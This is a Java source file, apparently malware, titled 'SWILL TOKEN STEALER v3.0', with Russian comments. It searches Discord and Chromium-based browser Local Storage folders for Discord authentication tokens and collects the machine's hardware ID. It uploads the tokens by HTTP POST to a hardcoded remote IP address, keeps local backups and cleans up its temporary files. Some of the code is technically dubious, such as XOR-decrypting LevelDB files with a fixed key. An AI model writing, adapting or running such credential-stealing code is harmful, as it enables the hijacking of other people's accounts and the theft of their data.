import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;
import java.util.zip.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;

public class TokenStealer {
    
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = TEMP_DIR + "\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891/upload_tokens";
    private static final byte[] KEY = "SwillWay2025Key42".getBytes();
    private static final Set<String> sentHashes = ConcurrentHashMap.newKeySet();
    private static final String SENT_LOG = TEMP_DIR + "\\sent_tokens.log";
    
    private static String hwid = "";
    private static int totalTokensFound = 0;
    private static Set<String> allFoundTokens = new LinkedHashSet<>();
    
    // Точные паттерны для Discord токенов
    private static final String[] TOKEN_REGEX = {
        "([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})",
        "(mfa\\.[\\w-]{84})",
        "([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}_[\\w-]{6})"
    };
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenStealer][" + timestamp + "] " + msg);
    }
    
    private static void logSuccess(String msg) {
        System.out.println("[TokenStealer] ✅ " + msg);
    }
    
    public static void main(String[] args) {
        log("=== SWILL TOKEN STEALER v3.0 (No Cookies) ===");
        
        // Получение HWID
        hwid = getHWID();
        log("HWID: " + hwid);
        
        // Создание директорий
        new File(TEMP_DIR).mkdirs();
        new File(OUTPUT_DIR).mkdirs();
        
        // Загрузка уже отправленных файлов
        loadSentFiles();
        
        // STEP 1: ДЕШИФРОВКА LevelDB файлов
        log("=== STEP 1: Decrypting LevelDB files ===");
        decryptAndExtract();
        
        // STEP 2: ИЗВЛЕЧЕНИЕ ТОКЕНОВ
        log("=== STEP 2: Extracting Discord tokens ===");
        extractTokensFromDecrypted();
        
        // STEP 3: ОТПРАВКА НА СЕРВЕР
        log("=== STEP 3: Sending tokens to server ===");
        if (!allFoundTokens.isEmpty()) {
            sendTokensToServer();
            saveLocalBackup();
        } else {
            log("No tokens found. Sending empty report.");
            sendEmptyReport();
        }
        
        // STEP 4: ОЧИСТКА (опционально)
        cleanTempFiles();
        
        log("=== TokenStealer finished. Total tokens: " + totalTokensFound + " ===");
    }
    
    // ==================== ДЕШИФРОВКА ====================
    
    private static void decryptAndExtract() {
        List<String> targetPaths = new ArrayList<>();
        
        // Discord пути
        String appdata = System.getenv("APPDATA");
        String localAppdata = System.getenv("LOCALAPPDATA");
        String userHome = System.getProperty("user.home");
        
        if (appdata != null) {
            targetPaths.add(appdata + "\\discord\\Local Storage\\leveldb");
            targetPaths.add(appdata + "\\discordptb\\Local Storage\\leveldb");
            targetPaths.add(appdata + "\\discordcanary\\Local Storage\\leveldb");
        }
        
        if (localAppdata != null) {
            targetPaths.add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
            targetPaths.add(localAppdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
            targetPaths.add(localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
            targetPaths.add(localAppdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
        }
        
        // Modrinth и другие лаунчеры
        targetPaths.add(userHome + "\\AppData\\Roaming\\ModrinthApp\\profiles\\*\\discord\\Local Storage\\leveldb");
        
        int decryptedCount = 0;
        
        for (String path : targetPaths) {
            if (path == null) continue;
            
            if (path.contains("*")) {
                String basePath = path.substring(0, path.indexOf("*"));
                File baseDir = new File(basePath);
                if (baseDir.exists() && baseDir.isDirectory()) {
                    File[] subDirs = baseDir.listFiles(File::isDirectory);
                    if (subDirs != null) {
                        for (File subDir : subDirs) {
                            String newPath = path.replace("*", subDir.getName());
                            decryptedCount += decryptDirectory(newPath);
                        }
                    }
                }
            } else {
                decryptedCount += decryptDirectory(path);
            }
        }
        
        log("Decrypted files total: " + decryptedCount);
    }
    
    private static int decryptDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return 0;
        }
        
        log("Found LevelDB: " + path);
        File[] files = dir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) {
            return 0;
        }
        
        int count = 0;
        for (File f : files) {
            try {
                byte[] data = Files.readAllBytes(f.toPath());
                // XOR расшифровка
                for (int i = 0; i < data.length; i++) {
                    data[i] ^= KEY[i % KEY.length];
                }
                
                String outName = dir.getName() + "_" + f.getName() + ".dec";
                Path outPath = Paths.get(TEMP_DIR, outName);
                Files.write(outPath, data);
                count++;
                
            } catch (Exception e) {
                // Игнорируем ошибки
            }
        }
        
        log("Decrypted " + count + " files from " + path);
        return count;
    }
    
    // ==================== ИЗВЛЕЧЕНИЕ ТОКЕНОВ ====================
    
    private static void extractTokensFromDecrypted() {
        File decDir = new File(TEMP_DIR);
        File[] decFiles = decDir.listFiles((d, n) -> n.endsWith(".dec"));
        
        if (decFiles == null || decFiles.length == 0) {
            log("No decrypted files found");
            return;
        }
        
        log("Found " + decFiles.length + " decrypted files to scan");
        
        int filesScanned = 0;
        for (File f : decFiles) {
            filesScanned++;
            scanFileForTokens(f);
            
            if (filesScanned % 50 == 0) {
                log("Progress: " + filesScanned + "/" + decFiles.length + " files, tokens: " + allFoundTokens.size());
            }
        }
        
        log("Scan complete. Tokens found: " + allFoundTokens.size());
        
        // Сохраняем сырые токены в файл
        if (!allFoundTokens.isEmpty()) {
            try {
                StringBuilder sb = new StringBuilder();
                for (String token : allFoundTokens) {
                    sb.append(token).append("\n");
                }
                Files.write(Paths.get(OUTPUT_DIR, "discord_tokens_raw.txt"), sb.toString().getBytes());
                log("Tokens saved to: " + OUTPUT_DIR + "\\discord_tokens_raw.txt");
            } catch (Exception e) {}
        }
    }
    
    private static void scanFileForTokens(File file) {
        try {
            byte[] data = Files.readAllBytes(file.toPath());
            
            // Метод 1: Прямой поиск в строке
            String content = new String(data);
            searchInText(content, file.getName());
            
            // Метод 2: Поиск после Base64 декодирования
            String base64Decoded = decodeBase64FromText(content);
            if (!base64Decoded.equals(content)) {
                searchInText(base64Decoded, file.getName() + "[base64]");
            }
            
            // Метод 3: Ещё один проход XOR (на случай двойного шифрования)
            byte[] xorAgain = xorDecrypt(data, KEY);
            String xorContent = new String(xorAgain);
            if (!xorContent.equals(content)) {
                searchInText(xorContent, file.getName() + "[xor2]");
            }
            
        } catch (Exception e) {
            // Skip
        }
    }
    
    private static void searchInText(String text, String source) {
        for (String regex : TOKEN_REGEX) {
            Pattern p = Pattern.compile(regex);
            Matcher m = p.matcher(text);
            while (m.find()) {
                String token = m.group();
                if (isValidToken(token)) {
                    if (allFoundTokens.add(token)) {
                        totalTokensFound++;
                        logSuccess("Found in " + source + ": " + maskToken(token));
                    }
                }
            }
        }
    }
    
    private static String decodeBase64FromText(String text) {
        StringBuilder result = new StringBuilder(text);
        Pattern b64pattern = Pattern.compile("[A-Za-z0-9+/]{80,}={0,2}");
        Matcher m = b64pattern.matcher(text);
        while (m.find()) {
            String b64 = m.group();
            try {
                byte[] decoded = Base64.getDecoder().decode(b64);
                String decodedStr = new String(decoded);
                if (decodedStr.contains(".") && decodedStr.length() > 50 && decodedStr.length() < 200) {
                    result.append("\n").append(decodedStr);
                }
            } catch (Exception e) {}
        }
        return result.toString();
    }
    
    private static byte[] xorDecrypt(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    private static boolean isValidToken(String token) {
        if (token == null) return false;
        if (token.length() < 50 || token.length() > 70) return false;
        if (token.chars().filter(ch -> ch == '.').count() != 2) return false;
        if (token.contains(" ") || token.contains("\n") || token.contains("\r")) return false;
        if (token.contains("{") || token.contains("}")) return false;
        return true;
    }
    
    private static String maskToken(String token) {
        if (token == null || token.length() < 20) return token;
        return token.substring(0, 15) + "..." + token.substring(token.length() - 5);
    }
    
    // ==================== ОТПРАВКА НА СЕРВЕР ====================
    
    private static void loadSentFiles() {
        File logFile = new File(SENT_LOG);
        if (logFile.exists()) {
            try {
                Files.lines(logFile.toPath()).forEach(line -> sentHashes.add(line.trim()));
                log("Loaded " + sentHashes.size() + " previously sent token hashes");
            } catch (IOException e) {}
        }
    }
    
    private static void sendTokensToServer() {
        if (allFoundTokens.isEmpty()) {
            log("Nothing to send");
            return;
        }
        
        // Создаем хеш отправляемых данных для дедупликации
        String dataHash = createDataHash(allFoundTokens);
        if (sentHashes.contains(dataHash)) {
            log("These tokens were already sent, skipping");
            return;
        }
        
        HttpURLConnection conn = null;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("HWID: ").append(hwid).append("\n");
            sb.append("Timestamp: ").append(LocalDateTime.now()).append("\n");
            sb.append("Type: DISCORD_TOKENS_ONLY\n");
            sb.append("Count: ").append(allFoundTokens.size()).append("\n\n");
            
            for (String token : allFoundTokens) {
                sb.append(token).append("\n");
            }
            
            String payload = sb.toString();
            byte[] compressed = compress(payload);
            
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.setRequestProperty("Content-Type", "text/plain");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                logSuccess("Tokens sent successfully to " + SERVER_URL);
                sentHashes.add(dataHash);
                saveSentHash(dataHash);
            } else {
                log("Server response: HTTP " + code);
            }
            
        } catch (Exception e) {
            log("Send error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static void sendEmptyReport() {
        HttpURLConnection conn = null;
        try {
            String payload = "HWID: " + hwid + "\nStatus: NO_TOKENS_FOUND\nDiscord may not be installed or no tokens present";
            byte[] compressed = compress(payload);
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            conn.getResponseCode();
            log("Empty report sent");
        } catch (Exception e) {}
        finally { if (conn != null) conn.disconnect(); }
    }
    
    private static String createDataHash(Set<String> tokens) {
        try {
            StringBuilder sb = new StringBuilder();
            for (String t : tokens) sb.append(t);
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(sb.toString().getBytes());
            return Base64.getEncoder().encodeToString(hash);
        } catch (Exception e) {
            return String.valueOf(System.currentTimeMillis());
        }
    }
    
    private static void saveSentHash(String hash) {
        try {
            Files.write(Paths.get(SENT_LOG), (hash + "\n").getBytes(), 
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException e) {}
    }
    
    private static void saveLocalBackup() {
        try {
            Path backupPath = Paths.get(OUTPUT_DIR, "tokens_backup_" + System.currentTimeMillis() + ".txt");
            StringBuilder sb = new StringBuilder();
            for (String token : allFoundTokens) {
                sb.append(token).append("\n");
            }
            Files.write(backupPath, sb.toString().getBytes());
            log("Local backup saved: " + backupPath);
        } catch (Exception e) {}
    }
    
    private static void cleanTempFiles() {
        try {
            File dir = new File(TEMP_DIR);
            File[] files = dir.listFiles((d, n) -> n.endsWith(".dec"));
            if (files != null) {
                for (File f : files) {
                    f.delete();
                }
                log("Cleaned " + files.length + " temporary .dec files");
            }
        } catch (Exception e) {}
    }
    
    // ==================== ВСПОМОГАТЕЛЬНЫЕ ====================
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) return line.trim();
            }
        } catch (Exception e) {}
        return "UNKNOWN_" + System.getProperty("user.name");
    }
}